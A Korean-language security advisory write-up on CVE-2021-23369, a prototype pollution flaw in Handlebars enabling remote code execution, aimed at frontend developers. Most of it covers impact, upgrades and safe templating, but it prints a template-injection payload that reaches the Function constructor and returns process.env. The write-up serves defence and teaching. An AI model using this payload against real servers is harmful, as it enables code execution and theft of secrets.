# CVE-2021-23369 - Handlebars Prototype Pollution RCE

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2021-23369 |
| CVSS | 9.8 (Critical) |
| 영향 패키지 | handlebars |
| 영향 버전 | < 4.7.7 |
| 수정 버전 | 4.7.7 |
| 공격 유형 | Prototype Pollution → Remote Code Execution |
| 발견일 | 2021-02-15 |

## 왜 프론트엔드 개발자가 알아야 하는가

Handlebars는 프론트엔드 생태계에서 매우 널리 사용되는 템플릿 엔진이다:

1. **SSR(Server-Side Rendering)**: Express + Handlebars로 서버 사이드 렌더링하는 프로젝트
2. **이메일 템플릿**: 회원가입 인증, 비밀번호 초기화 등 이메일 HTML 생성
3. **정적 사이트 생성기**: Assemble, Metalsmith 등에서 사용
4. **레거시 프로젝트**: Angular, React 이전의 많은 프로젝트가 Handlebars 기반
5. **빌드 도구**: 일부 Webpack 플러그인, Yeoman 제너레이터에서 내부적으로 사용

주간 다운로드 수가 수천만 건에 달하며, 간접 의존성으로 포함된 경우가 더 많다.

## 취약점 기술 분석

Handlebars 컴파일러가 템플릿을 JavaScript 함수로 변환할 때, 특정 입력 구조를 통해 **프로토타입 오염**이 가능하다. 오염된 프로토타입을 이용해 템플릿 컴파일 과정에서 임의 코드를 실행할 수 있다.

핵심 문제:
- `compile()` 함수가 템플릿 AST를 처리할 때, 객체 속성 접근에 대한 검증 부족
- `__proto__`, `constructor` 등 프로토타입 체인 속성을 통해 내부 함수 동작 변조 가능
- 변조된 동작이 `Function` 생성자를 통해 임의 코드 실행으로 이어짐

```javascript
// 취약점의 핵심 - 프로토타입 체인을 통한 속성 주입
function extend(obj, ...sources) {
  for (const source of sources) {
    for (const key in source) {
      // __proto__ 키를 필터링하지 않음!
      obj[key] = source[key];
    }
  }
}
```

## 공격 시나리오

```javascript
const Handlebars = require('handlebars');

// 프로토타입 오염을 통한 RCE 페이로드 (교육 목적)
const template = Handlebars.compile(
  '{{#with "s" as |string|}}\n' +
  '  {{#with "e"}}\n' +
  '    {{#with split as |conslist|}}\n' +
  '      {{this.pop}}\n' +
  '      {{this.push (lookup string.sub "constructor")}}\n' +
  '      {{this.pop}}\n' +
  '      {{#with string.split as |codelist|}}\n' +
  '        {{this.pop}}\n' +
  '        {{this.push "return process.env"}}\n' +
  '        {{this.pop}}\n' +
  '        {{#each conslist}}\n' +
  '          {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}\n' +
  '        {{/each}}\n' +
  '      {{/with}}\n' +
  '    {{/with}}\n' +
  '  {{/with}}\n' +
  '{{/with}}'
);
// 서버에서 임의 코드 실행 가능
```

## 방어 방법

### 즉각 조치
```bash
npm install handlebars@^4.7.7
# 간접 의존성인 경우
npm audit fix
```

```json
{
  "overrides": {
    "handlebars": ">=4.7.7"
  }
}
```

### 코드 레벨 방어
```javascript
// 사용자 입력을 절대 템플릿으로 컴파일하지 않기
// ❌ 위험
const template = Handlebars.compile(userInput);

// ✅ 안전 - 미리 정의된 템플릿에 데이터만 주입
const template = Handlebars.compile('<p>Hello, {{name}}</p>');
const result = template({ name: sanitize(userInput) });
```

### 장기 전략
- 템플릿 엔진을 최신 대안(React/Vue SSR)으로 마이그레이션 고려
- 사용자 입력이 템플릿 컴파일 단계에 도달하지 않도록 아키텍처 설계
- `Object.freeze(Object.prototype)`으로 프로토타입 오염 방어 (부작용 주의)

## 교훈 & 프론트엔드 적용 포인트

1. **Prototype Pollution은 JS 고유의 위협**: `__proto__`, `constructor.prototype` 접근을 항상 경계
2. **사용자 입력 ≠ 템플릿**: 사용자가 제공한 문자열을 `compile()`, `eval()`, `new Function()`에 전달 금지
3. **템플릿 엔진의 보안 모델 이해**: 데이터 바인딩과 템플릿 로직의 경계를 명확히
4. **Object.create(null) 패턴**: 프로토타입 없는 객체를 사용하면 Pollution 공격 방어 가능

## 참고 자료

- [NVD - CVE-2021-23369](https://nvd.nist.gov/vuln/detail/CVE-2021-23369)
- [Snyk Advisory](https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-1056767)
- [GitHub Advisory GHSA-765h-qjxv-5f44](https://github.com/advisories/GHSA-765h-qjxv-5f44)
- [Handlebars Known Vulnerabilities](https://handlebarsjs.com/guide/#known-vulnerabilities)
